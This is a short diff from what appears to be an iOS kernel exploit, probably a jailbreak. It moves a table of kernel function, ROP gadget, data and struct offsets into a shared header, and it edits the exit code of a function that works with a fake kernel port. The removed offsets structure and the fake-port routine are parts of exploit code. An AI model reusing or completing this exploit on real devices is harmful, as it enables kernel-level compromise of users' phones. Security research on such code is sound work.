@@ -48,76 +48,8 @@ typedef struct
 	unsigned int msgh_reserved;
 	int msgh_id;
 } mach_msg_header_t;
-typedef struct {
-    struct {
-        kptr_t kernel_image_base;
-    } constant;
 
-    struct {
-        kptr_t copyin;
-        kptr_t copyout;
-        kptr_t current_task;
-        kptr_t get_bsdtask_info;
-        kptr_t vm_map_wire_external;
-        kptr_t vfs_context_current;
-        kptr_t vnode_lookup;
-        kptr_t osunserializexml;
-        kptr_t smalloc;
-
-        kptr_t ipc_port_alloc_special;
-        kptr_t ipc_kobject_set;
-        kptr_t ipc_port_make_send;
-    } funcs;
-
-    struct {
-        kptr_t add_x0_x0_ret;
-    } gadgets;
-
-    struct {
-        kptr_t realhost;
-        kptr_t zone_map;
-        kptr_t kernel_task;
-        kptr_t kern_proc;
-        kptr_t rootvnode;
-        kptr_t osboolean_true;
-        kptr_t trust_cache;
-    } data;
-
-    struct {
-        kptr_t iosurface_root_userclient;
-    } vtabs;
-
-    struct {
-        uint32_t is_task_offset;
-        uint32_t task_itk_self;
-        uint32_t itk_registered;
-        uint32_t ipr_size;
-        uint32_t sizeof_task;
-        uint32_t task_all_image_info_addr;
-        uint32_t task_all_image_info_size;
-    } struct_offsets;
-
-    struct {
-        uint32_t create_outsize;
-        uint32_t create_surface;
-        uint32_t set_value;
-    } iosurface;
-
-	struct {
-		void (*write) (int fd,void * buf,uint64_t size);
-		kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
-		kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t * init_port_count);
-		mach_port_name_t (*mach_task_self) ();
-		kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
-		kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
-		kern_return_t (*mach_port_deallocate) (ipc_space_t task,mach_port_name_t name);
-		kern_return_t (*mach_port_allocate) (ipc_space_t task,mach_port_right_t right,mach_port_name_t *name);
-		kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
-		kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
-		mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
-		int (*posix_spawn) (uint64_t pid, const char * path, void *, void *, char * const argv[], char * const envp[]);
-	} userland_funcs;
-} offsets_t;
+#include "../shared/offsets.h"
 
 typedef volatile struct {
     uint32_t ip_bits;
@@ -676,12 +608,12 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 	offsets->userland_funcs.mach_port_deallocate(offsets->userland_funcs.mach_task_self(), the_one);
 
 	// spin for now
-	while (1) {}
+	//while (1) {}
 
 	// exit call
 	__asm__(
-			"movz x0, 0x0\n"
-			"movz x16, 0x1\n"
+			"movz x0, 0x0\n" // return 0
+			"movz x16, 0x1\n" // void exit(int rval)
 			"svc 0x80"
 			);
 }
